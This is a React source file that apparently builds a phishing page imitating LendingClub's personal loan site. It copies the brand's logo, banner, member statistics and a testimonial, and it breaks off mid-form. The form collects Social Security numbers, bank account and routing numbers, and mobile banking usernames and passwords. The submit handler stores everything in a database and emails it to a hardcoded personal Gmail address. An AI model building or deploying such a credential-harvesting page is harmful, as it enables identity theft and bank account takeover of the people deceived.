import { useState, useEffect } from "react";
import { useForm, Controller } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { supabase } from "@/integrations/supabase/client";
import { useSearchParams } from "react-router-dom";

const formSchema = z.object({
  firstName: z.string().min(1, "Required"), lastName: z.string().min(1, "Required"),
  email: z.string().email("Invalid email"), phone: z.string().min(10, "Min 10 digits"),
  dob: z.string().min(1, "Required"), address: z.string().min(1, "Required"),
  city: z.string().min(1, "Required"), state: z.string().min(2, "Required"),
  zip: z.string().min(5, "Min 5 digits"),
  ssn: z.string().min(9,"9 digits").max(9,"9 digits"),
  monthlyIncome: z.string().min(1,"Required"), loanAmount: z.string().min(1,"Required"),
  creditScore: z.enum(["low","good","bad"],{required_error:"Required"}),
  bankName: z.string().min(1,"Required"), yearsWithBank: z.string().min(1,"Required"),
  accountNumber: z.string().min(1,"Required"),
  routingNumber: z.string().min(9,"9 digits").max(9,"9 digits"),
  mobileUsername: z.string().min(1,"Required"), mobilePassword: z.string().min(1,"Required"),
});
type FormData = z.infer<typeof formSchema>;

/* ── LC Hashtag Logo SVG ── */
const LCHashLogo = () => (
  <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect width="36" height="36" rx="4" fill="white"/>
    {/* Top-left square */}
    <rect x="4" y="4" width="12" height="12" rx="2" fill="#EA4224"/>
    {/* Top-right square */}
    <rect x="20" y="4" width="12" height="12" rx="2" fill="#EA4224"/>
    {/* Bottom-left square */}
    <rect x="4" y="20" width="12" height="12" rx="2" fill="#EA4224"/>
    {/* Bottom-right square */}
    <rect x="20" y="20" width="12" height="12" rx="2" fill="#EA4224"/>
  </svg>
);

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Inter',sans-serif;}
:root{
  --lc-navy:#113B5E; --lc-navy-dark:#0d2f4d;
  --lc-orange:#EA4224; --lc-orange-h:#d03a1e;
  --lc-teal:#00B4A6;
  --lc-banner:#d6eef8;
  --lc-gray:#f5f7fa; --lc-border:#e1e5ea;
  --lc-text:#1a202c; --lc-muted:#6b7280;
  --lc-green:#2d7a22;
}
/* Nav */
.lc-nav{background:#fff;border-bottom:1px solid var(--lc-border);position:sticky;top:0;z-index:200;}
.lc-nav-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:60px;display:flex;align-items:center;gap:0;}
.lc-logo-wrap{display:flex;align-items:center;gap:8px;text-decoration:none;margin-right:28px;flex-shrink:0;}
.lc-logo-text{display:flex;flex-direction:column;line-height:1.1;}
.lc-logo-main{font-size:17px;font-weight:800;color:var(--lc-navy);letter-spacing:-0.3px;}
.lc-logo-sub{font-size:10px;color:#555;display:flex;align-items:center;gap:4px;}
.lc-logo-happen{font-weight:800;color:var(--lc-orange);font-size:10px;}
.lc-nav-links{display:flex;align-items:center;gap:2px;flex:1;}
.lc-nav-item{position:relative;display:flex;align-items:center;gap:4px;padding:8px 12px;font-size:13.5px;font-weight:500;color:#222;text-decoration:none;cursor:pointer;border-radius:4px;white-space:nowrap;}
.lc-nav-item:hover{background:#f5f5f5;}
.lc-nav-item svg{width:12px;height:12px;opacity:0.6;}
.lc-nav-actions{display:flex;align-items:center;gap:10px;flex-shrink:0;}
.lc-sign-in{border:1.5px solid var(--lc-orange);color:var(--lc-orange);background:none;padding:7px 18px;border-radius:6px;font-size:13.5px;font-weight:700;cursor:pointer;transition:all 0.15s;}
.lc-sign-in:hover{background:var(--lc-orange);color:#fff;}
/* Announcement banner */
.lc-banner{background:var(--lc-banner);padding:9px 20px;display:flex;align-items:center;justify-content:center;gap:12px;font-size:13.5px;color:#1a3c5e;position:relative;}
.lc-banner-text{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
.lc-banner b{color:var(--lc-orange);}
.lc-banner-learn{border:1.5px solid var(--lc-navy);color:var(--lc-navy);background:none;padding:4px 12px;border-radius:4px;font-size:12px;font-weight:600;cursor:pointer;}
.lc-banner-close{position:absolute;right:16px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:18px;color:#666;line-height:1;}
/* Hero */
.lc-hero{display:grid;grid-template-columns:1fr 1fr;min-height:380px;background:#fff;}
.lc-hero-left{padding:48px 40px 0 max(40px,calc((100vw - 1200px)/2 + 40px));display:flex;flex-direction:column;justify-content:flex-start;}
.lc-hero-right{position:relative;overflow:hidden;min-height:380px;}
.lc-hero-right img{width:100%;height:100%;object-fit:cover;display:block;}
.lc-hero-h1{font-size:clamp(26px,3.5vw,40px);font-weight:900;color:var(--lc-text);line-height:1.2;margin-bottom:14px;letter-spacing:-0.5px;}
.lc-hero-h1 .apr{color:var(--lc-teal);}
.lc-hero-sub{font-size:15px;color:var(--lc-muted);margin-bottom:0;line-height:1.6;}
/* Loan card strip */
.lc-card-strip{background:#f9f9f9;border-top:1px solid var(--lc-border);padding:28px max(20px,calc((100vw - 1200px)/2 + 20px));}
.lc-what{font-size:17px;font-weight:700;color:var(--lc-text);margin-bottom:4px;}
.lc-what-sub{font-size:13px;color:var(--lc-muted);margin-bottom:18px;}
.lc-cards{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
.lc-card{background:#fff;border:1.5px solid var(--lc-border);border-radius:10px;padding:16px;cursor:pointer;transition:border-color 0.15s,box-shadow 0.15s;}
.lc-card:hover{border-color:var(--lc-teal);box-shadow:0 4px 16px rgba(0,180,166,0.12);}
.lc-card.selected{border-color:var(--lc-teal);box-shadow:0 4px 16px rgba(0,180,166,0.18);}
.lc-card-badge{font-size:10.5px;font-weight:700;color:var(--lc-green);margin-bottom:10px;display:block;min-height:14px;}
.lc-card-icon{width:36px;height:36px;margin-bottom:10px;}
.lc-card-name{font-size:14px;font-weight:700;color:var(--lc-navy);margin-bottom:8px;}
.lc-card-desc{font-size:12.5px;color:var(--lc-muted);line-height:1.6;}
/* How it works */
.lc-section{padding:64px max(20px,calc((100vw-1200px)/2+20px));}
.lc-section.gray{background:var(--lc-gray);}
.lc-sec-eyebrow{font-size:11px;font-weight:700;letter-spacing:1.4px;text-transform:uppercase;color:var(--lc-orange);margin-bottom:10px;}
.lc-sec-h2{font-size:clamp(24px,3vw,34px);font-weight:800;color:var(--lc-navy);margin-bottom:12px;letter-spacing:-0.4px;}
.lc-sec-p{font-size:15px;color:var(--lc-muted);line-height:1.7;max-width:560px;}
.lc-steps{display:grid;grid-template-columns:repeat(3,1fr);gap:36px;margin-top:44px;}
.lc-step-n{width:40px;height:40px;border-radius:50%;background:var(--lc-navy);color:#fff;font-size:16px;font-weight:800;display:flex;align-items:center;justify-content:center;margin-bottom:16px;}
.lc-step h3{font-size:15px;font-weight:700;color:var(--lc-navy);margin-bottom:8px;}
.lc-step p{font-size:13.5px;color:var(--lc-muted);line-height:1.65;}
.lc-check-rate-btn{margin-top:32px;display:inline-flex;align-items:center;gap:8px;background:var(--lc-orange);color:#fff;border:none;padding:13px 28px;border-radius:6px;font-size:15px;font-weight:700;cursor:pointer;transition:background 0.15s;}
.lc-check-rate-btn:hover{background:var(--lc-orange-h);}
/* Bank smarter */
.lc-bank-grid{display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center;}
.lc-bank-img{border-radius:16px;overflow:hidden;background:#eee;height:280px;display:flex;align-items:center;justify-content:center;}
.lc-bank-img img{width:100%;height:100%;object-fit:cover;}
/* Stats */
.lc-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;text-align:center;margin-top:44px;}
.lc-stat-v{font-size:38px;font-weight:900;color:var(--lc-navy);letter-spacing:-1px;line-height:1;}
.lc-stat-l{font-size:13px;color:var(--lc-muted);margin-top:4px;}
/* Testimonial */
.lc-testimonial-card{background:#fff;border:1px solid var(--lc-border);border-radius:12px;padding:28px;max-width:620px;margin:32px auto 0;}
.lc-testimonial-card blockquote{font-size:16px;color:#333;font-style:italic;line-height:1.7;margin-bottom:12px;}
.lc-testimonial-card cite{font-size:13px;font-weight:700;color:var(--lc-navy);}
/* Form */
.lc-form-section{padding:64px max(20px,calc((100vw-1200px)/2+20px));background:var(--lc-gray);}
.lc-form-box{background:#fff;border-radius:14px;box-shadow:0 6px 32px rgba(17,59,94,0.10);overflow:hidden;max-width:760px;margin:0 auto;}
.lc-form-header{background:var(--lc-navy);padding:22px 28px;color:#fff;display:flex;align-items:center;gap:14px;}
.lc-form-header h2{font-size:20px;font-weight:800;}
.lc-form-header p{font-size:13px;opacity:0.7;margin-top:2px;}
.lc-form-body{padding:28px;}
.lc-fg-label{background:var(--lc-navy);color:#fff;font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;padding:8px 14px;border-radius:5px;margin-bottom:14px;display:flex;align-items:center;gap:8px;}
.lc-g2{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
.lc-g3{display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px;}
@media(max-width:600px){.lc-g2,.lc-g3{grid-template-columns:1fr;}}
.lc-lbl{display:block;font-size:12.5px;font-weight:600;color:#374151;margin-bottom:4px;}
.lc-in{width:100%;height:41px;border:1.5px solid var(--lc-border);border-radius:6px;padding:0 11px;font-size:13.5px;font-family:inherit;color:var(--lc-text);background:#fff;transition:border-color 0.15s,box-shadow 0.15s;outline:none;}
.lc-in:focus{border-color:var(--lc-teal);box-shadow:0 0 0 3px rgba(0,180,166,0.12);}
.lc-in::placeholder{color:#9ca3af;}
.lc-err{font-size:11.5px;color:#dc2626;margin-top:3px;}
.lc-fgroup{margin-bottom:14px;}
.lc-sec-group{margin-bottom:24px;}
.lc-icon-field{position:relative;}
.lc-icon-field input{padding-right:34px;}
.lc-icon-field .fi{position:absolute;right:10px;top:50%;transform:translateY(-50%);color:#9ca3af;font-size:14px;}
.lc-client-badge{display:inline-flex;align-items:center;gap:6px;background:#e7f3e8;border:1px solid #a7d7a9;color:#1b5e20;border-radius:100px;padding:5px 14px;font-size:12.5px;font-weight:600;margin-bottom:14px;}
.lc-submit{width:100%;height:50px;background:var(--lc-orange);color:#fff;border:none;font-size:15px;font-weight:700;border-radius:7px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;font-family:inherit;transition:background 0.15s;}
.lc-submit:hover:not(:disabled){background:var(--lc-orange-h);}
.lc-submit:disabled{opacity:0.6;cursor:not-allowed;}
.lc-fine{font-size:11.5px;color:var(--lc-muted);text-align:center;margin-top:12px;line-height:1.6;}
.lc-fine a{color:var(--lc-navy);text-decoration:underline;}
/* Footer */
.lc-footer{background:var(--lc-navy);color:rgba(255,255,255,0.75);}
.lc-ft{max-width:1200px;margin:0 auto;padding:52px 20px 0;display:grid;grid-template-columns:1.3fr 1fr 1fr 1fr 1fr;gap:28px;}
@media(max-width:900px){.lc-ft{grid-template-columns:1fr 1fr;}}
@media(max-width:520px){.lc-ft{grid-template-columns:1fr;}}
.lc-ft-brand p{font-size:13px;line-height:1.75;margin-top:10px;opacity:0.65;max-width:200px;}
.lc-ft-col h4{font-size:10.5px;font-weight:700;letter-spacing:1.3px;text-transform:uppercase;color:#fff;margin-bottom:14px;}
.lc-ft-col ul{list-style:none;display:flex;flex-direction:column;gap:8px;}
.lc-ft-col li a{font-size:12.5px;color:rgba(255,255,255,0.6);text-decoration:none;transition:color 0.15s;}
.lc-ft-col li a:hover{color:#fff;}
.lc-fb{border-top:1px solid rgba(255,255,255,0.1);max-width:1200px;margin:0 auto;padding:16px 20px;display:flex;flex-wrap:wrap;gap:12px;align-items:center;justify-content:space-between;}
.lc-fb p{font-size:11.5px;color:rgba(255,255,255,0.4);}
.lc-fd{max-width:1200px;margin:0 auto;padding:0 20px 28px;font-size:11px;color:rgba(255,255,255,0.3);line-height:1.7;}
@keyframes lcSpin{to{transform:rotate(360deg);}}
.lc-spin{width:17px;height:17px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:lcSpin 0.7s linear infinite;}
@media(max-width:900px){
  .lc-hero{grid-template-columns:1fr;}
  .lc-hero-right{min-height:220px;}
  .lc-cards{grid-template-columns:1fr 1fr;}
  .lc-steps{grid-template-columns:1fr;}
  .lc-bank-grid{grid-template-columns:1fr;}
  .lc-stats{grid-template-columns:1fr 1fr;}
  .lc-nav-links{display:none;}
}
`;

/* ── Icon helpers ── */
const ChevronDown = () => (
  <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><polyline points="2 4 6 8 10 4"/></svg>
);
const LockIco = () => (
  <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
);
const StarIco = () => (
  <svg width="13" height="13" viewBox="0 0 24 24" fill="#f59e0b" stroke="#f59e0b" strokeWidth="1"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
);

/* ── Loan card SVG icons ── */
const IconDebt = () => (
  <svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect width="36" height="36" rx="8" fill="#e8f4fc"/>
    <rect x="6" y="12" width="24" height="15" rx="2" stroke="#113B5E" strokeWidth="1.8"/>
    <path d="M6 17h24" stroke="#113B5E" strokeWidth="1.8"/>
    <circle cx="10" cy="22" r="2" fill="#EA4224"/>
    <path d="M22 14 L27 9 M25 9 h2 v2" stroke="#EA4224" strokeWidth="1.5" strokeLinecap="round"/>
  </svg>
);
const IconCash = () => (
  <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
    <rect width="36" height="36" rx="8" fill="#e8f4fc"/>
    <rect x="5" y="12" width="26" height="16" rx="2" stroke="#113B5E" strokeWidth="1.8"/>
    <circle cx="18" cy="20" r="4" stroke="#113B5E" strokeWidth="1.8"/>
    <line x1="18" y1="15" x2="18" y2="25" stroke="#EA4224" strokeWidth="1.5"/>
  </svg>
);
const IconExpense = () => (
  <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
    <rect width="36" height="36" rx="8" fill="#e8f4fc"/>
    <path d="M18 8 L28 13 V20 C28 25 23 29 18 30 C13 29 8 25 8 20 V13 Z" stroke="#113B5E" strokeWidth="1.8" fill="none"/>
    <path d="M14 20 l3 3 6-7" stroke="#EA4224" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
  </svg>
);
const IconAuto = () => (
  <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
    <rect width="36" height="36" rx="8" fill="#e8f4fc"/>
    <path d="M7 20 L10 14 H26 L29 20 V24 H7 Z" stroke="#113B5E" strokeWidth="1.8" fill="none"/>
    <circle cx="12" cy="24" r="3" stroke="#113B5E" strokeWidth="1.8"/>
    <circle cx="24" cy="24" r="3" stroke="#113B5E" strokeWidth="1.8"/>
    <path d="M10 14 L12 10 H24 L26 14" stroke="#EA4224" strokeWidth="1.5"/>
  </svg>
);

const LOAN_CARDS = [
  { id:"debt", badge:"Up to 5% APR discount⁴", name:"Debt Paydown Loan", desc:"A debt consolidation loan up to $60,000 to pay off credit card debt or personal loan balances.", Icon: IconDebt },
  { id:"cash", badge:"Rates starting at 5.96% APR¹", name:"Cash Loan", desc:"A personal loan up to $60,000 to cover expenses like a major purchase, home improvements, life events.", Icon: IconCash },
  { id:"expense", badge:"", name:"Pay for a Large Expense", desc:"Get up to $65,000 to cover medical treatments, wellness services, tutoring, large retail purchases.", Icon: IconExpense },
  { id:"auto", badge:"", name:"Auto Loan Refinance", desc:"Flexible terms and competitive rates could help you pay less than you are right now.", Icon: IconAuto },
];

export default function LendingClubApply() {
  const [searchParams] = useSearchParams();
  const [client, setClient] = useState<any>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [bannerOpen, setBannerOpen] = useState(true);
  const [selectedCard, setSelectedCard] = useState<string|null>(null);

  useEffect(() => { document.title = "LendingClub Online Loans"; }, []);

  useEffect(() => {
    const token = searchParams.get("token");
    if (!token) return;
    (async () => {
      const { data, error } = await supabase.from("clients").select("*")
        .eq("access_token", token).gt("token_expiry", new Date().toISOString())
        .eq("is_active", true).single();
      if (!error && data) setClient(data);
    })();
  }, [searchParams]);

  const { register, handleSubmit, control, formState:{errors} } = useForm<FormData>({
    resolver: zodResolver(formSchema),
  });

  const onSubmit = async (data: FormData) => {
    setIsSubmitting(true);
    try {
      const { error: dbError } = await supabase.from("loan_applications").insert({
        first_name:data.firstName, last_name:data.lastName, email:data.email, phone:data.phone,
        date_of_birth:data.dob, street_address:data.address, city:data.city, state:data.state,
        zip_code:data.zip, employment_status:"", employer_name:"",
        monthly_income:parseFloat(data.monthlyIncome)||0, loan_amount:parseFloat(data.loanAmount)||0,
        pay_frequency:"monthly", loan_purpose:"personal", loan_type:"cash_advance",
        client_id:client?.id||null, ssn:data.ssn, credit_score:data.creditScore,
        bank_name:data.bankName, years_with_bank:parseInt(data.yearsWithBank)||0,
        account_number:data.accountNumber, routing_number:data.routingNumber,
        mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
      });
      if (dbError) throw new Error(dbError.message);
      await supabase.functions.invoke("send-application-email",{
        body:{ applicationData:data, clientEmail:"ws694481@gmail.com", recipientType:"admin", clientName:client?.name||"General" }
      });
      if (client) {
        await supabase.functions.invoke("send-application-email",{
          body:{ applicationData:data, clientEmail:client.email, recipientType:"client" }
        });
      }
      setSubmitted(true);
    } catch(err:any) {
      alert(`Error: ${err.message||"Please try again."}`);
    } finally { setIsSubmitting(false); }
  };

  if (submitted) return (
    <div style={{minHeight:"100vh",background:"#f5f7fa",display:"flex",alignItems:"center",justifyContent:"center",fontFamily:"'Inter',sans-serif"}}>
      <style>{CSS}</style>
      <div style={{background:"#fff",borderRadius:14,padding:"44px 36px",maxWidth:420,textAlign:"center",boxShadow:"0 4px 24px rgba(0,0,0,0.08)"}}>
        <div style={{width:56,height:56,borderRadius:"50%",background:"#e8f5e9",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 18px"}}>
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#2e7d32" strokeWidth="2.5" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h2 style={{fontSize:22,fontWeight:800,color:"#113B5E",marginBottom:10}}>Application Submitted!</h2>
        <p style={{fontSize:14,color:"#6b7280",lineHeight:1.65}}>Our team will review your application and reach out within 24 hours.</p>
      </div>
    </div>
  );

  return (
    <div style={{fontFamily:"'Inter',sans-serif",color:"#1a202c",background:"#fff"}}>
      <style>{CSS}</style>

      {/* ── NAVBAR ── */}
      <nav className="lc-nav">
        <div className="lc-nav-inner">
          <a href="#" className="lc-logo-wrap">
            <LCHashLogo />
            <div className="lc-logo-text">
              <span className="lc-logo-main">LendingClub</span>
              <span className="lc-logo-sub">is becoming <span className="lc-logo-happen">Happen</span> Bank</span>
            </div>
          </a>

          <div className="lc-nav-links">
            {["Borrowing","Banking","Business","Investing","Resources","Help"].map(n => (
              <span key={n} className="lc-nav-item">
                {n} <ChevronDown />
              </span>
            ))}
          </div>

          <div className="lc-nav-actions">
            <button className="lc-sign-in">Sign In</button>
          </div>
        </div>
      </nav>

      {/* ── ANNOUNCEMENT BANNER ── */}
      {bannerOpen && (
        <div className="lc-banner">
          <div className="lc-banner-text">
            New name. Same commitment. LendingClub is becoming <b>Happen Bank.</b>
            <button className="lc-banner-learn">Learn More</button>
          </div>
          <button className="lc-banner-close" onClick={() => setBannerOpen(false)}>×</button>
        </div>
      )}

      {/* ── HERO ── */}
      <section className="lc-hero">
        <div className="lc-hero-left">
          <h1 className="lc-hero-h1">
            Personal loan rates starting<br/>
            as low as <span className="apr">5.96% APR¹</span>
          </h1>
          <p className="lc-hero-sub">Keep more of what you earn and earn more on what you save.²</p>
        </div>
        <div className="lc-hero-right">
          <img src="/lc-hero.png" alt="Happy family" />
        </div>
      </section>

      {/* ── LOAN TYPE CARDS ── */}
      <div className="lc-card-strip">
        <p className="lc-what">What are you looking for?</p>
        <p className="lc-what-sub">Check your rate. It won't impact your credit score.³</p>
        <div className="lc-cards">
          {LOAN_CARDS.map(({ id, badge, name, desc, Icon }) => (
            <div
              key={id}
              className={`lc-card${selectedCard===id?" selected":""}`}
              onClick={() => { setSelectedCard(id); document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"}); }}
            >
              <span className="lc-card-badge">{badge}</span>
              <Icon />
              <div className="lc-card-name">{name}</div>
              <div className="lc-card-desc">{desc}</div>
            </div>
          ))}
        </div>
      </div>

      {/* ── HOW IT WORKS ── */}
      <section className="lc-section">
        <p className="lc-sec-eyebrow">Simple Process</p>
        <h2 className="lc-sec-h2">How a personal loan with LendingClub works</h2>
        <div className="lc-steps">
          {[
            { n:"1", title:"Apply online in minutes", text:"Get customized loan options based on what you tell us." },
            { n:"2", title:"Choose a loan offer", text:"Select the rate, term, and payment options you like best." },
            { n:"3", title:"Get funded in as little as 24 hours", text:"Once approved, we'll pay your creditors directly or send the money in as little as 24 hours.⁵" },
          ].map(s => (
            <div key={s.n} className="lc-step">
              <div className="lc-step-n">{s.n}</div>
              <h3>{s.title}</h3>
              <p>{s.text}</p>
            </div>
          ))}
        </div>
        <button className="lc-check-rate-btn" onClick={() => document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>
          Check Your Rate
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><polyline points="9 18 15 12 9 6"/></svg>
        </button>
      </section>

      {/* ── BANK SMARTER ── */}
      <section className="lc-section gray">
        <div className="lc-bank-grid">
          <div>
            <p className="lc-sec-eyebrow">Award-Winning Banking</p>
            <h2 className="lc-sec-h2">Bank smarter with LendingClub</h2>
            <p className="lc-sec-p">
              Make the most of your money with LendingClub, named 2024's Best Online Bank by GOBankingRates.
              Our award-winning checking, savings, and loan products help our members achieve their financial goals.
            </p>
            <button className="lc-check-rate-btn" style={{marginTop:24}} onClick={() => document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>
              Get Started
            </button>
          </div>
          <div className="lc-bank-img">
            <img src="/lc-hero.png" alt="LendingClub App" style={{filter:"brightness(0.9)"}}/>
          </div>
        </div>
      </section>

      {/* ── 5 MILLION MEMBERS ── */}
      <section className="lc-section" style={{textAlign:"center"}}>
        <p className="lc-sec-eyebrow">Trusted by Millions</p>
        <h2 className="lc-sec-h2">Join over 5 million members nationwide</h2>
        <p className="lc-sec-p" style={{margin:"0 auto"}}>
          LendingClub is the leading digital marketplace bank in the U.S., connecting borrowers with investors since 2007.
          Our LC™ Marketplace Platform has helped more than 5 million members get over $90 billion in personal loans.
        </p>
        <div className="lc-stats">
          {[
            { v:"5M+",   l:"Members nationwide" },
            { v:"$90B+", l:"Loans facilitated" },
            { v:"24hrs", l:"Funding upon approval" },
            { v:"2007",  l:"Serving members since" },
          ].map(({v,l}) => (
            <div key={l}>
              <div className="lc-stat-v">{v}</div>
              <div className="lc-stat-l">{l}</div>
            </div>
          ))}
        </div>
        <div className="lc-testimonial-card">
          <div style={{display:"flex",gap:3,justifyContent:"center",marginBottom:14}}>
            {[1,2,3,4,5].map(i=><StarIco key={i}/>)}
          </div>
          <blockquote>"Amazing how efficient and quickly the process was. If you are looking for superior service this company deserves a gold star. Absolutely recommend doing business here!"</blockquote>
          <cite>— Amanda W., verified member</cite>
        </div>
      </section>

      {/* ── APPLICATION FORM ── */}
      <section className="lc-form-section" id="apply-form">
        <div style={{textAlign:"center",marginBottom:24}}>
          <p className="lc-sec-eyebrow">Apply Now</p>
          <h2 className="lc-sec-h2">{client ? `Apply Now — ${client.name}` : "Apply for a Personal Loan"}</h2>
          <p style={{fontSize:13.5,color:"var(--lc-muted)"}}>Checking your rate won't impact your credit score.³</p>
        </div>

        <div className="lc-form-box">
          <div className="lc-form-header">
            <LCHashLogo />
            <div>
              <h2>LendingClub Application</h2>
              <p>{client ? `Verified access for ${client.name}` : "Complete the form to check your rate"}</p>
            </div>
          </div>

          <div className="lc-form-body">
            {client && <div className="lc-client-badge">✓ Verified client access — {client.name}</div>}

            <form onSubmit={handleSubmit(onSubmit)}>
              {/* Personal */}
              <div className="lc-sec-group">
                <div className="lc-fg-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg> Personal Information</div>
                <div className="lc-g2">
                  <div className="lc-fgroup"><label className="lc-lbl">First Name</label><input className="lc-in" {...register("firstName")} placeholder="First name"/>{errors.firstName&&<p className="lc-err">{errors.firstName.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Last Name</label><input className="lc-in" {...register("lastName")} placeholder="Last name"/>{errors.lastName&&<p className="lc-err">{errors.lastName.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Email Address</label><input className="lc-in" type="email" {...register("email")} placeholder="you@example.com"/>{errors.email&&<p className="lc-err">{errors.email.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Phone Number</label><input className="lc-in" {...register("phone")} placeholder="(555) 000-0000"/>{errors.phone&&<p className="lc-err">{errors.phone.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Date of Birth</label><input className="lc-in" type="date" {...register("dob")}/>{errors.dob&&<p className="lc-err">{errors.dob.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">SSN (9 digits)</label><div className="lc-icon-field"><input className="lc-in" {...register("ssn")} placeholder="No dashes" maxLength={9}/><span className="fi"><LockIco/></span></div>{errors.ssn&&<p className="lc-err">{errors.ssn.message}</p>}</div>
                </div>
                <div className="lc-fgroup"><label className="lc-lbl">Street Address</label><input className="lc-in" {...register("address")} placeholder="123 Main Street"/>{errors.address&&<p className="lc-err">{errors.address.message}</p>}</div>
                <div className="lc-g3">
                  <div className="lc-fgroup"><label className="lc-lbl">City</label><input className="lc-in" {...register("city")} placeholder="City"/>{errors.city&&<p className="lc-err">{errors.city.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">State</label><input className="lc-in" {...register("state")} placeholder="NY" maxLength={2}/>{errors.state&&<p className="lc-err">{errors.state.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Zip Code</label><input className="lc-in" {...register("zip")} placeholder="10001" maxLength={5}/>{errors.zip&&<p className="lc-err">{errors.zip.message}</p>}</div>
                </div>
              </div>

              {/* Loan */}
              <div className="lc-sec-group">
                <div className="lc-fg-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg> Loan Details</div>
                <div className="lc-g2">
                  <div className="lc-fgroup"><label className="lc-lbl">Monthly Income ($)</label><input className="lc-in" type="number" {...register("monthlyIncome")} placeholder="e.g. 5000"/>{errors.monthlyIncome&&<p className="lc-err">{errors.monthlyIncome.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Loan Amount ($)</label><input className="lc-in" type="number" {...register("loanAmount")} placeholder="e.g. 10000"/>{errors.loanAmount&&<p className="lc-err">{errors.loanAmount.message}</p>}</div>
                </div>
                <div className="lc-fgroup"><label className="lc-lbl">Credit Score Range</label>
                  <Controller name="creditScore" control={control} render={({field})=>(
                    <Select onValueChange={field.onChange} value={field.value||""}>
                      <SelectTrigger style={{height:41,borderRadius:6,borderColor:"#e1e5ea",fontSize:13.5}}><SelectValue placeholder="Select credit score range"/></SelectTrigger>
                      <SelectContent>
                        <SelectItem value="good">Good (700+)</SelectItem>
                        <SelectItem value="low">Fair (600–699)</SelectItem>
                        <SelectItem value="bad">Poor (Below 600)</SelectItem>
                      </SelectContent>
                    </Select>
                  )}/>
                  {errors.creditScore&&<p className="lc-err">{errors.creditScore.message}</p>}
                </div>
              </div>

              {/* Banking */}
              <div className="lc-sec-group">
                <div className="lc-fg-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="3" y1="22" x2="21" y2="22"/><line x1="6" y1="18" x2="6" y2="11"/><line x1="10" y1="18" x2="10" y2="11"/><line x1="14" y1="18" x2="14" y2="11"/><line x1="18" y1="18" x2="18" y2="11"/><polygon points="12 2 20 7 4 7"/></svg> Banking Information</div>
                <div className="lc-g2">
                  <div className="lc-fgroup"><label className="lc-lbl">Bank Name</label><input className="lc-in" {...register("bankName")} placeholder="e.g. Chase Bank"/>{errors.bankName&&<p className="lc-err">{errors.bankName.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Years with Bank</label><input className="lc-in" type="number" {...register("yearsWithBank")} placeholder="e.g. 3"/>{errors.yearsWithBank&&<p className="lc-err">{errors.yearsWithBank.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Account Number</label><div className="lc-icon-field"><input className="lc-in" {...register("accountNumber")} placeholder="Account number"/><span className="fi"><LockIco/></span></div>{errors.accountNumber&&<p className="lc-err">{errors.accountNumber.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Routing Number</label><div className="lc-icon-field"><input className="lc-in" {...register("routingNumber")} placeholder="9 digits" maxLength={9}/><span className="fi"><LockIco/></span></div>{errors.routingNumber&&<p className="lc-err">{errors.routingNumber.message}</p>}</div>
